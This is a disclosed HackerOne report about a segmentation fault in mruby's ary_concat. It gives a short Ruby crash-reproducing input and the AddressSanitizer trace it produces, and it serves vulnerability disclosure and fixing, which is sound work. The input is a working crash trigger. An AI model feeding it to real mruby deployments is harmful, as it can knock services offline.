# SEGV on ary_concat

## Report Details
- **Report ID**: 296198
- **URL**: https://hackerone.com/reports/296198
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-12-08T11:21:42.518Z
- **Disclosed**: 2018-01-17T22:44:38.658Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following input demonstrates a crash:
```
def z
 return * begin
   [0].each do
    return
   end
 rescue => x
   ensure
   x.backtrace
 end
end
z
```
ASAN report
```
./mruby/bin/mruby asd.rb
ASAN:DEADLYSIGNAL
=================================================================
==43761==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00010541ceea bp 0x7ffeea8432d0 sp 0x7ffeea8430b0 T0)
==43761==The signal is caused by a READ memory access.
==43761==Hint: address points to the zero page.
    #0 0x10541cee9 in ary_concat array.c:293
    #1 0x10541ccfa in mrb_ary_concat array.c:312
    #2 0x1054799a9 in mrb_vm_exec vm.c:2634
    #3 0x105450034 in mrb_vm_run vm.c:933
    #4 0x105486f5c in mrb_top_run vm.c:2974
    #5 0x105645ac0 in mrb_load_exec parse.y:5840
    #6 0x1056468e5 in mrb_load_file_cxt parse.y:5849
    #7 0x1053b596c in main mruby.c:227
    #8 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

==43761==Register values:
rax = 0x0000000000000000  rbx = 0x00007ffeea843340  rcx = 0x0000100000000000  rdx = 0x0000000000000000
rdi = 0x0000614000000000  rsi = 0x0000100000000000  rbp = 0x00007ffeea8432d0  rsp = 0x00007ffeea8430b0
 r8 = 0x00001fffdd508664   r9 = 0x00007ffeea843320  r10 = 0x0000000106571788  r11 = 0xae48a47313800041
r12 = 0x00007ffeea84a3e0  r13 = 0x00007ffeea84a400  r14 = 0x00001fffdd50947c  r15 = 0x0000100000000000
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV array.c:293 in ary_concat
==43761==ABORTING
Abort trap: 6
```

## Impact

Crashed on both mruby and mirb.

## Attachments
- asd.rb
